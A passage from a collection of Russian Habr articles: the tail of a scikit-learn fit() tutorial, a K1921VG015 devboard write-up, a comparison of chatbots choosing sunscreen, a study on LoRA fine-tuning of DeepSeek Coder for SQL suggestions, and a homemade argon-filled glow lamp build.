rf.fit(X_train, y_train)
Хотим добавить ещё 50 деревьев:
rf.n_estimators = 100
rf.fit(X_train, y_train)  # новые 50 деревьев дописываются к существующим
Это позволяет постепенно наращивать сложность модели, не теряя уже обученные структуры.
Часто мы объединяем разные шаги в единый конвейер — посмотрим, как Pipeline и GridSearchCV взаимодействуют с fit().
Pipeline и GridSearchCV
С Pipeline мы объединяем несколько шагов:
from sklearn.pipeline import Pipeline

pipe = Pipeline([
    ('scaler', StandardScaler()),
    ('clf', LogisticRegression())
])
pipe.fit(X_train, y_train)
Последовательность действий:
scaler.fit_transform(X_train)
clf.fit(X_scaled, y_train)
Если этот пайплайн завернуть в GridSearchCV, для каждого набора параметров он будет прогонять fit() заново, сохранять результаты и выбирать наилучший вариант.
Параметры обучения и колбэки
В чистом scikit-learn у fit() самые распространённые доп. параметры — это sample_weight и флаги для проверки входных данных. Но многие сторонние библиотеки (XGBoost, LightGBM) через знакомый интерфейс fit() принимают:
early_stopping_rounds — остановка по валидационной метрике
eval_set — данные для валидации
verbose — подробный лог обучения
А что делать, если модель может упаковаться в мультиядерный режим? Тут пригодится n_jobs.
Отладка и профилирование fit()
Чтобы понять, куда уходит время и память, рекомендую:
cProfile:
python -m cProfile train.py
line_profiler и @profile для детального разбора функций
memory_profiler:
from memory_profiler import profile
@profile
def train():
    model.fit(X, y)
verbose у моделей для по‑шаговых логов
Что важно запомнить
В итоге — fit() это последовательность: валидация, сохранение параметров, запуск fit() и запись результатов. Для потоковых данных используйте partialfit(), для дообучения ансамблей — warm_start. Собирайте всё в Pipeline, подключайте GridSearchCV и не забывайте про логирование и профилирование.
Хотите освоить машинное обучение с нуля и стать уверенным Junior-специалистом? Онлайн-курс Otus «Machine Learning. Basic» — это ваш шанс получить знания от экспертов отрасли и прокачать навыки на реальных проектах.
За время обучения вы не только разберётесь в теории, но и будете решать реальные задачи, анализировать данные и строить свои первые модели. Прокачайте компетенции, которые востребованы на рынке, и начните карьеру в одном из самых перспективных направлений!"
Devboard для К1921ВГ015,https://habr.com/ru/articles/909992/,"Недавно в комментариях к статье о К1921ВГ015 я выкладывал фотографию своей макетной платы. Даже простой скриншот вызвал живой интерес, а некоторые читатели попросили поделиться проектом в текущем виде...","Недавно в комментариях к статье о К1921ВГ015 я выкладывал фотографию своей макетной платы. Даже простой скриншот вызвал живой интерес, а некоторые читатели попросили поделиться проектом в текущем виде — без финальных доработок и тестов.
К сожалению, в последнее время мои приоритеты изменились, и уделять время хобби стало сложнее. Заказ плат, сборка и тестирование могут затянуться, я решил выложить проект до проверки. В качестве компенсации подробно опишу все ключевые моменты.
Концепция платы
За основу взята синяя плата из рекламных материалов на озоне. Однако при попытке её повторить выяснилось, что она:
Использует минимум 4 слоя
Содержит дорогую обвязку
При подробном рассмотрении, общая компоновка мне показалась удачной, но что бы ее развести на 2 слоя - пришлось попотеть. При разводке учел некоторые советы, которые давали автору и мне. Например то, что люди хотят видеть больше информации и управления на лицевой части платы вместо компонентов. Кто то просил контактную площадку под крокодила - сделал.
Общая схема подключения была частично заимствована из схемы которую мне прислали хорошие люди, что должно было снизить общее количество ошибок. Оригинал, к сожалению, показать не могу, так как информация не для распространения.
Обвязка контроллера
На плате часть компонентов можно не ставить или заменить перемычками. Так что на крайний случай можно оставить только то что необходимо.
Установлены два кварца: высокочастотный и часовой. Кварцы компактные, но широко доступны на популярных площадках. К сожалению пайка без фена потребует от вас терпения и опыта. Примеры кварцев есть в описании компонента в KiCad, там есть ссылки для приобретения.
Для аналоговой части используется дроссель ЭМП (решение из официальных рекомендаций). Возможна замена дросселя перемычками.
Формирователь AREF собран на многооборотном подстроечном резисторе. Компоненты подобраны так, чтобы можно было поставить модуль, формирующий опорное напряжение на Г-образной гребенке с убранным четвертым пином. В общем можно накидать на макете опорник и жестко запаять ее на гребенке прямо в плату вместо подстроечника и двух штырьков.
Два основных светодиода сигнализируют о корректной работе: PLED — общее питание, ALED — аналоговое питание (если не горит - проблема с дросселем).
Сброс контроллера организован через супервизор питания. В оригинале использовался супервизор TLC7733ID, но из-за его дороговизны пришлось искать альтернативу. Один из самых доступных по цене супервизоров TPS3823-33 и на нем можно сделать так же дублирующую схему сброса контроллера. Но если вы не хотите использовать супервизор - предусмотрена перемычка и джампер (**STD**) для перехода на стандартный способ сброса контроллера.
Батарейное питание организовано по официальному документу рекомендации. Если батарея не нужна, можно не устанавливать диодную сборку и запаять перемычку VCC1 → V_BAT.
Для входа в сервисный режим есть кнопка, которая дублирует джампер SERVEN. Если кнопка запаяна, штыри джампера можно и не паять.
Одна из интересных особенностей этого микроконтроллера - отдельные выводы питания для разных периферийных блоков, что требует установки четырёх танталовых конденсаторов — не самое частое решение для микроконтроллеров. Их, к сожалению, запаять все же придется.
Изначально я пропустил что один конденсатор цепляется к AGND, хотя в рекомендации на это есть акцент.
Коммуникации
С портом JTAG я никогда не работал, но взял распиновку из оригинальной схемы. Также прошелся в интернете, вроде как это очень распространенный стандарт. Наверное, лучше было бы добавить еще перемычку под пайку, чтобы можно было по-умолчанию разорвать питание от порта JTAG. Не знаю насколько это актуально.
Для каждого порта UART есть набор сигнализационных светодиодов UART STATUS. На низких скоростях проблем быть не должно, а вот если заходите поднять скорости выше 115200 - их придется выпаять - они подключены напрямую. Зато их можно использовать, при необходимости, как сигнализацию у неиспользуемых uart портов.
На нижнюю гребенку выведены все основные средства коммуникации, кроме CAN портов. В этом микроконтроллере у каждого порта GPIO есть несколько альтернативных функций. Но на гребенку выведены те, что стоят на первом месте в таблице описания GPIO. Мне не совсем известно - имеет ли это значение, но пусть будет так.
Верхняя гребенка не имеет GPIO вовсе. Каждый из этих портов уникален и у каждого из них есть своя, только одна функция. На против каждого уникального порта, есть соответствующий ему GND пин. Для аналоговых входов AGND, для обычных просто GND.
Справа 2 гребенки содержат полный набор контактов портов ABC, что на самом деле очень удобное и удачное решение. Я уже начал разводить плату коммуникации, с дисплеем, которая двумя шлейфами подключалась бы к основной плате. Но она слишком сырая, чтобы ее выкладывать. В любом случае, на ней можно найти все что нужно для подключения периферии.
Как видно, гребенки были обильно смазаны пинами GND и VCC(3.3V). Потому что лично мне их очень сильно не хватает на стандартных макетках.
USB
USB Разъемы распаяны на изолированном участке платы. Это сделано для удобства коммутации.
Плата имеет два порта USB и может питаться от любого из них. Для выбора источника питания используется гребенка 5V!, на которой нужно скомутировать согласно схеме на плате источник питания. Вы можете питать плату от JTAG и не использовать стабилизатор при подключении по USB или разъем питания.
Каждый источник питания подключается через диод, поэтому, даже если вы подключите несколько источников - ничего страшного случиться не должно. Но если вы решитие не ставить диоды, то рекомендуется использовать только один источник питания в гребенке 5V!.
Каждый из портов имеет защиту по входу. Но она так сделана, что при желании, вы можете ее не ставить, и все будет просто работать без нее.
Верхний порт отвечает за подключение непосредственно к самому контроллеру. Второй порт используется как преобразователь USB->UART. Вы можете скоммутировать преобразователь USB->UART не для UART0 просто перекоммутировав его проводами. Изначально я его разводил под CH340G, но, посмотрев какие есть более современные доступные варианты, пришел к выводу, что лучше использовать версию CH340X, которая не требует кварца и в целом куда компактнее CH340G.
Отдельной гребенкой выведено напряжение 5V, полученное с USB или с разъема питания. Учитывайте падение на диоде, который отделяет напряжение разных источников питания.
Пинауты и доп информация
Проект платы/герберы/сверловку/пинауты можно найти на github под лицензией MIT.
Пинауты для платы генерились тут - https://splitbrain.github.io/pinoutleaf/"
ChatGPT подбирает SPF на уровне консультанта в магазине косметики,https://habr.com/ru/articles/909964/,"Думаю, многие из вас видели прекрасный отчет Adobe, в котором говорилось о том, что растет доля трафика из нейронок в онлайн-магазины. Мол, нейронки уже умеют подбирать товары и справляются с этим пол...","Думаю, многие из вас видели прекрасный отчет Adobe, в котором говорилось о том, что растет доля трафика из нейронок в онлайн-магазины. Мол, нейронки уже умеют подбирать товары и справляются с этим получше абстрактного пользователя.
Недавно потребовалось выбрать SPF-крем, и я решила потестировать 3 популярные нейронки для этого сценария. Рассказываю, что из этого вышло.
ChatGPT подбирает SPF на уровне консультанта из Летуаль
Я сказала ОК и задала 3 разным нейронкам одни и те же вопросы.
Сначала:
1. помоги подобрать SPF, продукт и бренд
В ответ все прислали простыню про выбор SPF. Дальше пишу:
2. задавай уточняющие вопросы по одному
И после того, как заданы основные вопросы и выдана рекомендация от нейронки, я включаю продвинутого пользователя SPF кремов, и прошу
3. уточни про химические фильтры в составе, спирт и силиконы
Поскольку в выданных нейронкам ранее особенностях кожи есть противопоказания к этим компонентам.
Что же насоветовали мне мои некожаные друзья?
GigaChat
Финалочка диалога
+ Советы по выбору адекватные.
+ Вопросы уместные: про фототип, использование и особенности кожи.
+ В итоге предложил несколько средств и неплохо их аргументировал
- Не спросил предпочитаемый формат средства (крем, гель, флюид).
- Не справился с вопросами «продвинутого пользователя», отделавшись общим текстом про химические фильтры, спирт и силиконы
- Было ожидание, что среди ответов будут лидеры российского рынка SPF, но увы и ах, в список вошли только зарубежные производители
DeepSeek
Финалочка от DeepSeek.
+ Советы по выбору адекватные.
+ Вопросы уместные: про фототип, использование и особенности кожи.
+ После этого спросил про любимый формат средства. И это правильная последовательность
+ Предложил несколько средств, неплохо их аргументировал и сам дал рекомендации, на какие ингредиенты в составе обратить внимание (избегать) и как тестировать.
+ С вопросами продвинутого пользователя справился на ура, единственный из всех нейронок уточнил отдельно про силиконы, которые улетучиваются (и не вредят)
+ Итоговый список был интересным, разнообразным по брендам и с уточнениями
ChatGpt
Финалочка от ChatGpt
+ Советы по выбору адекватные.
- Начал с вопроса про предпочитаемый формат, и по ощущениям, сразу этим сузил себе поле для выбора.
+ Вопросы уместные: про фототип, использование и особенности кожи.
+ Предложил несколько средств
- Вопросы «продвинутого пользователя» слил творчески. По ощущениям, опирался на маркетинговое описание, а не состав, и не заходил за рамки изначально установленных ограничений, которые сам себе создал (любимый форм-фактор - флюид).
Общение очень напоминало разговор с мотивированным конcультантом косметического магазина, «Этот SPF от Biotherm действительно содержит химические фильтры, спирт и силикон, но в нем есть увлажняющие компоненты, а силикон в креме – для удержания влаги. Вам подойдёт.».
- Предлагал, и сразу пытался слиться с темы выбора средств с учетом их состава, уворачивался и выворачивался.
Меня зовут Таня. Мы с мужем ведем канал Семейка Продактов.
И мини-чарт по результатам опроса, в ролях:
3 место GigaChat.
Был беднее всех на опции, но...цельный. Спросил - ответил, не знает - ответил что знает. По крайней мере, вел себя уверенно.
2 место ChatGpt. По субъективным ощущениям хуже всех, но знания обширные. Товарищ производил впечатление консультанта косметического магазина. Читаешь - и сразу ищешь, где подвох.
1 место DeepSeek. Порадовал. Примерно так же меня могут пронавигировать в салоне красоты, где продают линейки профессиональных косметических кремов.
Хороши. Но чтобы выбрать подходящий SPF, пока нужно пообщаться с профи и разобраться в ингредиентах самому.
P.S. И слава богу"
Как LLM могут помочь аналитикам баз данных в работе с SQL-запросами,https://habr.com/ru/companies/sberbank/articles/909730/,"В современных компаниях корпоративные хранилища данных (Data Warehouse) играют критически важную роль, обеспечивая централизованное хранение и обработку больших объёмов информации. Данные поступают из...","В современных компаниях корпоративные хранилища данных (Data Warehouse) играют критически важную роль, обеспечивая централизованное хранение и обработку больших объёмов информации. Данные поступают из разнообразных источников: операционных систем, CRM, ERP, IoT-устройств, веб-аналитики, мобильных приложений и других платформ, отражая все аспекты деятельности организации. На основе этой информации компании формируют разного рода отчётность, отслеживают ключевые показатели эффективности (KPI), оптимизируют бизнес-процессы, прогнозируют рыночные тенденции и принимают стратегические решения.
Эффективная работа с хранилищем невозможна без участия бизнес- и системных аналитиков, которые проектируют структуры данных, очищают и объединяют информацию, адаптируя решения под меняющиеся задачи. С ростом объёмов данных и требований к скорости анализа даже опытные команды сталкиваются с вызовами. Рутинные операции — проектирование схем, поиск таблиц, проверка качества данных — требуют не только технических навыков, но и глубокого понимания бизнес-контекста. Большую часть времени занимает написание и оптимизация SQL-запросов, что становится «узким местом» в условиях динамично меняющихся требований.
Ошибки в SQL-запросах или недостаточное знание структуры данных приводит к потерям времени и снижению точности аналитики. Для решения этих проблем на помощь приходят технологии на основе больших языковых моделей (LLM), таких как GigaChat, GPT, BERT или DeepSeek. Обученные на исторических данных и журналах запросов, они способны автоматизировать подбор таблиц, JOIN-условий и шаблонов SQL. 
Я покажу на примере, как системные аналитики могут использовать настроенные LLM для упрощения написания SQL-запросов. Основная гипотеза состоит в том, что если адаптировать модель на специфических для определённого хранилища данных запросах, то можно рекомендовать таблицы, JOIN-условия и даже целые фрагменты запросов, основываясь на предыдущем опыте (журналах) и текущих потребностях. 
Подход к решению
Давайте используем большие языковые модели (LLM), которые предварительно обучены на обширных текстовых данных и способны генерировать текстовые последовательности. Однако стандартные LLM изначально не адаптированы для работы с конкретными хранилищами данных. Поэтому ключевым шагом является их дообучение (тонкая настройка, fine-tuning) на специфических данных и примерах запросов. Дообучение модели состоит из нескольких этапов:
Подготовка данных. Сбор (генерация) журналов SQL-запросов к хранилищу за определённый период. Эти журналы содержат реальные примеры запросов, в том числе часто используемые таблицы, JOIN-условия и фрагменты кода. Изучение схемы базы данных позволяет выявить наиболее востребованные таблицы и индексы и связи между ними.
Тонкая настройка модели. Использование подготовленных данных и специализированных методик для дообучения LLM. На этом этапе модель учится «понимать» специфику хранилища данных и может предлагать релевантные рекомендации.
Оценка результатов модели. Применение метрик качества генерации текста.
Для генерации журналов SQL-запросов использовалась упрощённая модель данных (см. структуру в репозитории), созданная вручную и не имеющая практической применимости. Она представляет собой структуру, состоящую из 50 связанных между собой таблиц. Хотя эта модель не отражает реальных бизнес-процессов, она позволяет протестировать работу LLM в условиях «игрушечного» примера.
На основе модели мы сгенерировали  SQL-журналы (5000 примеров), содержащие примеры запросов, которые могли бы быть выполнены в реальной аналитической системе, но без использования реальных данных. Работает код следующим образом: 
Читает описание таблиц, столбцов и связей между ними из Excel-файла (например, названия таблиц, типы данных колонок).
Случайно выбирает таблицы и связи между ними.
Добавляет условия фильтрации (WHERE), соответствующие типу данных (например, для чисел — сравнения, для дат — диапазоны).
Формирует JOIN-условия на основе связей между таблицами:
Разделяет каждый запрос на две части: «вопрос» (начало запроса) и «ответ» (продолжение), чтобы имитировать обучение модели «вопрос-ответ». Например:
Выбор языковой модели важен для успешного решения задачи генерации SQL-запросов, так как он напрямую влияет на качество, эффективность и применимость результатов. В первую очередь SQL имеет строгие правила построения запросов (например, использование ключевых слов, правильное расположение условий, соблюдение порядка операций). LLM, ориентированная на обработку естественного языка, может не справиться с этими требованиями. Также SQL-запросы зависят от определённой структуры базы данных (таблиц, столбцов, связей). Языковая модель должна уметь анализировать контекст и предлагать корректные JOIN-условия, фильтры и агрегации.
Поэтому использование модели, изначально ориентированной на генерацию кода, позволяет лучше учитывать особенности и обеспечивать более точные результаты. DeepSeek Coder — это специализированная языковая модель, разработанная для задач, связанных с программированием и генерацией кода. Она обучена на большом объёме данных, включающем в себя исходный код на различных языках программирования (например, Python, Java, SQL), и понимает синтаксис, структуру и логику программного кода.Модель доступна на платформе Hugging Face. 
Традиционный подход к тонкой настройке модели, при котором обновляются все параметры, становится неэффективным и ресурсоёмким из-за огромного размера современных LLM. Это делает полное дообучение дорогим, трудоёмким и зачастую непрактичным. Взамен был разработан метод параметро-эффективного обучения (Parameter-Efficient Fine-Tuning, PEFT), который позволяет оптимизировать производительность моделей, значительно снижая затраты на процессорного времени и памяти.
Эффективность fine-tuning языковых моделей объясняется их низкой внутренней размерностью — способностью адаптироваться к новым задачам, меняя лишь небольшую часть параметров. Методы, учитывающие внутреннюю размерность модели, позволяют сократить затраты на тонкую настройку.
PEFT — это техника тонкой настройки предобученных языковых моделей, которая сосредоточена на обучении лишь небольшой части параметров, оставляя основную массу весов модели неизменной. Идея заключается в том, чтобы адаптировать модель под конкретные задачи, обучая только небольшое подмножество параметров, в то время как большая часть модели остаётся замороженной. Этот подход обеспечивает высокую эффективность при минимальных затратах ресурсов. Преимущества PEFT:
Обучение ограничено небольшим подмножеством параметров, что значительно ускоряет процесс.
Тонкая настройка только части параметров уменьшает нагрузку на оборудование и сокращает затраты на хранение данных.
Заморозка большинства параметров помогает избежать переобучения модели под новые данные.
PEFT минимизирует эффект катастрофического забывания, позволяя модели адаптироваться к новым задачам без потери ранее приобретённых навыков.
Контрольные точки, созданные с помощью PEFT, занимают меньше места, что упрощает их развёртывание и перенос на другие устройства.
Популярные методы PEFT:
LoRA (Low-Rank Adaptation): использует низкоранговые матрицы для аппроксимации изменений весов модели.
Adapter Modules: добавляет небольшие нейронные сети (адаптеры) между слоями модели.
Prefix Tuning: добавляет обучаемые «префиксы» к скрытым состояниям модели.
Prompt Tuning: модифицирует входные данные добавлением обучаемых «промптов».
BitFit: обучает только смещения (bias) в параметрах модели, оставляя веса неизменными.
В своей работе мы использовали метод LoRA, который позволяет обучать только небольшое количество параметров, используя низкоранговые аппроксимации для изменения весов модели. Это значительно снижает требования к памяти и ускоряет обучение, сохраняя при этом высокую производительность модели. Кратко, пусть исходный вес слоя — матрица . LoRA добавляет декомпозицию низкого ранга: , где:
— обучаемые матрицы ();
— адаптация с рангом .
Таким образом, вместо обновления всех параметров матрицы метод LoRA требует оптимизации только параметров, содержащихся в матрицах и . Это существенно уменьшает количество обучаемых параметров. Для используемой LLM оптимизация на стадии настройки составила более 94 % (обучаемые 786 432 вместо 1 347 258 368 параметров).
Метрика ROUGE-L-SQL (Recall-Oriented Understudy for Gisting Evaluation — Longest Common Subsequence for SQL) адаптирует классический подход ROUGE-L для оценки структурной и семантической близости сгенерированных SQL-запросов к эталонным. Метрика основана на вычислении наибольшей общей подпоследовательности (Longest Common Subsequence, LCS) между SQL-запросами. В отличие от стандартных текстовых метрик, ROUGE-L-SQL учитывает синтаксические особенности SQL, включая:
иерархию операторов (SELECT, JOIN, WHERE);
контекстные зависимости между таблицами и полями;
условия фильтрации и агрегации.
Для корректного сравнения SQL-запросов мы предварительно разделили их на логические единицы (ключевые слова SQL (например, SELECT, FROM, WHERE), идентификаторы (имена таблиц и столбцов), операторы (=, <, >), знаки пунктуации (;, ,, (, )), и др.) и токенизирировали. Этот процесс обеспечивает унифицированное представление запросов, независимо от их форматирования (например, регистр символов или пробелы).
Наибольшая общая подпоследовательность (LCS) — это последовательность токенов, которая встречается в обоих запросах в том же порядке, но не обязательно подряд. Формально, для двух последовательностей токенов и LCS определяется как:
,где: 
 — подпоследовательность и , и ;
 — длина ;
максимум берётся по всем возможным общим подпоследовательностям и .
На основе LCS вычисляются три ключевые метрики: precision (P, измеряет долю токенов сгенерированного запроса, которые совпадают с токенами эталонного запрос), recall (R,измеряет долю токенов эталонного запроса, которые совпадают с токенами сгенерированного запроса) и F1-score (F1, представляет собой гармоническое среднее между precision и recall):
, где — длина сгенерированного запроса;
, где — длина эталонного запроса;
, если ; — в противном случае.
Дополнительной метрикой оценки качества модели может служить комбинация алгоритма сравнения абстрактных синтаксических деревьев (AST) и расстояния Левенштейна. Алгоритм сравнения AST в классе позволяет оценить структурную схожесть SQL-запросов, игнорируя поверхностные различия (алиасы, литералы, форматирование). Расстояние Левенштейна оценивает разницу между строками, представляющими структуры AST, то есть первым шагом SQL-запросы нормализуются (удаляются алиасы, заменяются литералы), преобразуются в AST-формат, затем определяется большая длина между двумя запросами (D) и расстояние Левенштейна (L). Схожесть (S) рассчитывается по формуле: .
Полный процесс обучения (три цикла) с использованием двух GPU Tesla T4 15 Гб занял около 86 минут с финальным ROUGE-L-SQL = 0,4497. В качестве тестового промта использовали часть случайного запроса (iput). Полученный результат (output) соединили с промтом и использовали для поиска сгенеренного ранее SQL-запроса по принципу максимальной похожести (AST-similarity). 
Заключение
Использование LLM для рекомендации SQL-запросов демонстрирует определённый потенциал в оптимизации работы аналитиков. Проведённое исследование показало, что тонкая настройка моделей на специфических данных хранилища позволяет эффективно генерировать структуры запросов, JOIN-условия и фильтры.  
Практическая значимость работы заключается в демонстрации возможности интеграции LLM в процессы системного анализа, особенно для задач с повторяющимися паттернами. Однако исследование имеет ограничения: использованная модель данных была искусственной, что может не полностью отражать сложность реальных хранилищ.  
Для получения более точных и значимых результатов необходимо провести:  
Тестирование на реальных данных с учётом бизнес-контекста.  
Эксперименты с другими архитектурами LLM и методами PEFT.  
Разработку метрик, учитывающих не только синтаксическую, но и семантическую корректность запросов (например, через верификацию результатов выполнения).  
Внедрение подобных решений способно снизить нагрузку на аналитиков и минимизировать риски, связанные с человеческим фактором, что особенно актуально в условиях растущих объёмов данных.
Список используемых источников
Scaling Down to Scale Up: A Guide to Parameter-Efficient Fine-Tuning - https://arxiv.org/pdf/2303.15647 
INTRINSIC DIMENSIONALITY EXPLAINS THE EFFECTIVENESS OF LANGUAGE MODEL FINE-TUNING - https://arxiv.org/pdf/2012.13255 
Instruction Tuning for Large Language Models: A Survey - https://arxiv.org/pdf/2308.10792 
LORA: LOW-RANK ADAPTATION OF LARGE LANGUAGE MODELS - https://arxiv.org/pdf/2106.09685 
DeepSeek LLM Scaling Open-Source Language Models with Longtermism - https://arxiv.org/pdf/2401.02954 
Parameter-Efficient Fine-Tuning for Large Models: A Comprehensive Survey - https://arxiv.org/pdf/2403.14608 
Abstract Syntax Tree for Programming Language Understanding and Representation: How Far Are We? - https://arxiv.org/pdf/2312.00413 
ASTormer: An AST Structure-aware Transformer Decoder for Text-to-SQL - https://arxiv.org/pdf/2310.18662 
SELF-INSTRUCT: Aligning Language Models with Self-Generated Instructions - https://arxiv.org/pdf/2212.10560 
Don’t Stop Pretraining: Adapt Language Models to Domains and Tasks - https://arxiv.org/pdf/2004.10964 
Lifelong Pretraining: Continually Adapting Language Models to Emerging Corpora - https://arxiv.org/pdf/2110.08534 
Continual Pre-Training of Large Language Models: How to (re)warm your model? - https://arxiv.org/pdf/2308.04014 
Николай Абрамов, участник профессионального сообщества Сбера DWH/BigData. Профессиональное сообщество отвечает за развитие компетенций в таких направлениях как экосистема Hadoop, PostgreSQL, GreenPlum, а также BI инструментах Qlik, Apache SuperSet и др."
Самодельная газоразрядная Хабралампа V 1.1,https://habr.com/ru/companies/ruvds/articles/908058/,"Ещё одна самодельная лампа с символами, из учебно-тренировочной серии с упрощённой обработкой и из дешёвого стекла от ламп дневного света (ЛДС). От предыдущих работ отличается крупной надписью с ориги...","Ещё одна самодельная лампа с символами, из учебно-тренировочной серии с упрощённой обработкой и из дешёвого стекла от ламп дневного света (ЛДС). От предыдущих работ отличается крупной надписью с оригинальным, условно-объёмным расположением букв, работой на постоянном токе, компактным электродом-геттером из титана.

▍ 1. Концепция

Большая Хабралампа, работающая на переменном токе [1] вышла не вполне удачной по технологическим причинам, но и конструкция её электродов, очевидно, усложнена. Лаконичнее и проще в изготовлении лампа для работы на постоянном токе, например, [2]. Скрестим эти два прибора, а чтобы повторяться меньше, символы выполним трёхмерными.

▍ 2. Стекло

Стеклянная часть электровакуумного прибора (ЭВП) сделана из очищенных и протравленных кусков ЛДС типоразмеров Т8 и Т12, аналогично [1, 2]. Это стекло платиновой группы, требующее повышенной деликатности при нагреве и охлаждении из-за высокого коэффициента температурного расширения (КТР), впрочем, тонкие его стенки смягчают капризный нрав.

▍ 3. Стеклянные детали лампы. Колба

Фото 3.1. Заготовку крупной трубки запечатал — сильно разогрел её конец, захватил и оттянул размягчённое стекло пинцетом, переплавил сужение, поддув в открытый конец с оплавленными краями, выровнял полукруглое «пробирочное дно»

Фото 3.2. Сделал отверстие для впаивания штенгеля — технологической трубочки для откачки и наполнения лампы: подстудил донышко в негорячей части факела, ручной горелкой с маленьким горячим огнём разогрел точку на стекле, быстро и сильно продул мягкую часть колбы в тончайший пузырь. Сколол пузырик, оплавил края отверстия

Фото 3.3. Разогрел торец штенгеля и края отверстия на колбе, поаккуратнее слепил их, выровнял детали

Фото 3.4. Закоптил спаянное место в светящем пламени, уложил замедленно остывать в базальтовое одеяло

▍ 4. Стеклянные детали лампы. Гребешковая ножка

Фото 4.1. Короткую, чтобы не вихляла на державке, заготовку-трубку, насадил на пробку с ручкой в патроне шуруповёрта, разогрел свободный конец в сильном горячем пламени, сформовал юбочку графитовой развёрткой [3], повторил на обратной стороне заготовки

Фото 4.2. Заготовку с расширениями нагрел и сделал перетяжку, отколол вытянутый стеклянный ус-перемычку у основания деталей. Насадил деталь на полую державку, вложив в неё подготовленную пару трёхзвенных, никель-платинит-нержавейка, скреплённых проволочных выводов. Сильно разогрел место впая, сплющил стекло вокруг средней платинитовой части выводов. Спаянную ножку закоптил и уложил в базальтовое одеяло

Фото 4.3. Готовые ножки. Вместе с колбами (глава 3) отжёг их в электропечи для снятия внутренних напряжений

▍ 5. Электродная система

Пусть это будет недлинная надпись — всё тот же [1] «ХАБР», со сваренными из полосочек, буквами.

Фото 5.1. В этот раз применим для символов заготовки поуже и потолще — ленту из нержавеющей стали AISI 316, толщиной 0,4 мм. Она всё ещё неплохо режется простыми ручными ножницами по металлу

Фото 5.2. Элементы букв сварил контактной сваркой [4]

Фото 5.3. Элементы отрезал в размер кусачками плоскогубцев

Фото 5.4. Гнутые элементы из ровных полос сделал, повернув их концы на 90 ̊ — способ очень технологичный и не без своеобразной эстетики

Фото 5.5. Готовые буквы около колбы лампы — примерка

Фото 5.6. Рамку для однообразной установки букв сварил той же контактной сваркой из нержавеющей проволоки Ø 0,8 мм

Фото 5.7. Буквы в рамку установил, приварив к каждой по две нетолстых никелевых проволочки. Выгнул буквы, поминутно примеряя надпись в рамке к колбе прибора

Фото 5.8. Второй электрод с элементами геттера, собрал аналогично — контактной сваркой. Рамка из той же нержавейки, и того же размера, на рамку намотал и приварил титановую, Ø 0,3 мм, проволочку. Обе рамки с двух сторон снабдил проволочными отводами

Фото 5.9. Концы отводов обеих рамок временно сварил, скрепил их у основания стеклянными изоляторами — нагрел в пламени горелки, тут же разогрел палочку стекла, обмотал им проволочины и оплавил стекло в каплю

▍ 6. Сборка лампы

Фото 6.1. Выводы электродов укоротил, выгнув из них сверху распорку в колбе для электродной системы, снизу — оставив места для подключения к ножке лампы. Приварил к укороченным и сформованным выводам ножки

Фото 6.2. Примерка электродной системы на ножке к колбе лампы. Уже сейчас хорошо видно преимущества новой, по сравнению с [1], конструкции — прибор получается намного компактнее, а символы заметно крупнее. Заготовку колбы укоротил — обрезал накалённой проволокой [5]

Фото 6.3. Заварка лампы — разогрев край колбы в сильном горячем пламени, осаживаем его на юбочку ножки, ручной горелкой с маленьким пропано-кислородным факелом пропаиваем шов, поддувая в открытый штенгель, выравниваем место пайки

Фото 6.4. Тут же закоптим спай в светящем пламени и уложим работу в базальтовое одеяло для замедленного остывания

Фото 6.5. Спаянную остывшую лампу отожжём в печи для снятия внутренних напряжений. Медленный нагрев и остывание — полный цикл занимает без малого сутки. Максимальная температура отжига близка к началу размягчения стекла — под длинные висящие элементы приходится подкладывать опоры

Фото 6.6. Собранная лампа с открытым штенгелем

▍ 7. Откачка-наполнение лампы рабочим газом

Фото 7.1. Откачка лампы и наполнение её одноатомным аргоном с остаточным давлением около 250 Па, выполнена на упрощённой установке с ручным вакуумным насосом Комовского [6]. Работа выполнена методом замещения (промывки) в 10 циклов, по окончании лампу отпаял — переплавил штенгель у баллона

▍ 8. Включение лампы, тренировка

Фото 8.1. Первое включение лампы, постоянный ток, символы — катод. При токе около 10 мА, электрод светится только частично

Фото 8.2. Тренировка лампы — её работа с электродом-геттером, включённым катодом, а это его разогрев и, вероятно, распыление тонких частей

Фото 8.3. Работа лампы после нескольких часов тренировки — давление возросло, свечение стало размытее и получило явственный красноватый оттенок — в рабочем газе появился водород

Фото 8.4. Тем не менее надпись читается хорошо. Напряжение 212 вольт, ток 10 мА — через небольшое сопротивление лампа способна работать напрямую от осветительной сети, нагрев баллона умеренный

Фото 8.5

Фото 8.6. Работа лампы после ещё одного цикла тренировки — приэлектродное свечение стало выраженней и чуть ярче, но появилось много водорода, давшего красный объёмный фон. Электрические параметры остались близкими к прежним

Этой лампой мастер Гамбс заканчивает серию приборов из стекла от ЛДС и обработанных упрощённо.

▍ 9. Выводы

Подытожим последние работы, а это Хабралампа для работы на постоянном токе, изготовленная нами здесь, Хабралампа для тока переменного [1], Ё-лампа [2] и несколько упрощённых ламп [7, 9,10], изготовленных из того же стекла и по той же технологии.

Материалы. Очевидное — от стекла платинового [11] следует уходить к менее капризным стёклам молибденовой и вольфрамовой групп, тем более что добывать его приходится из ЛДС, буквально с риском для жизни из-за сопутствующих опасных веществ [8].

Стеклодувное. Юбочку гребешковым ножкам более или менее крупных размеров, делать только инструментом-развёрткой [3], а вращать заготовку механизировано — очень снижает процент брака при заварке лампы. Колбы делать только со штенгелем на макушке — конструкция ножки со штенгелем, встроенным, при ручном изготовлении себя не оправдала — упрощение при изготовлении деталей даёт большое усложнение при сборке — заварке лампы. Штенгель же наверху лампы настолько удобен в работе, что для его культурного припаивания не жалко изобрести специальное приспособление-станок, опять же — это ретровид у готовой лампы.

Фото 9.1. Вариант Хабралампы перед заваркой, со штенгелем, встроенным в ножку. Очевидно, при сильном нагреве низа колбы, в первую очередь будет расплавляться тонкий штенгель — его придётся защищать от повреждения металлическим экраном. Понадобится отдельная оснастка-державка для горячей лампы

Откачка-наполнение ламп в прежнем упрощённом варианте [6] никуда не годится — слишком низкое разрежение не даёт обезгаживания внутриламповых материалов даже при сравнительно высоком их нагреве, а это высокий процент ламп, работающих плохо.

Конструкция ламп, общие мероприятия. Титановый геттер, очевидно, работает, однако, перед установкой в лампу требует обезгаживания — нагрева в хорошем вакууме. Удалить впитавшиеся в него газы и прежде всего Н2, есть шанс и при правильной откачке лампы, а это, по крайней мере, 10^-3 Торр и 300 ̊ С. Перед заваркой лампы, следует хотя бы протравить электродную систему в сборе — очистить её от грубых внешних неорганических, а органические выгорают при отжиге, загрязнений.

▍ 10. Дополнительные материалы

1. Хабралампа для переменного тока, с дополнительным Ti геттером. Конспект автора.
